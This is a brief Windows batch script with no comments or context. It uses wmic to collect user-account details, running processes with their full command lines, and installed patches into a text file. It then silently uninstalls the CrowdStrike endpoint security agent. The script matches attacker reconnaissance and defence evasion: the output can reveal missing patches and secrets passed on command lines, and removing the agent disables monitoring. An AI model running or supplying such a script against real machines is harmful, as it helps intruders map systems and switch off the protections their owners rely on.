@echo off
setlocal

wmic useraccount get /ALL /format:csv > info.txt
wmic process get caption,executablepath,commandline /format:csv >> info.txt
wmic qfe get description,hotfixid,installedOn,ServicePackInEffect /format:csv >> info.txt
wmic /node:"127.0.0.1" product where "name like 'Crowdstrike%%'" call uninstall >> info.txt

echo "finished"
timeout 5 
endlocal
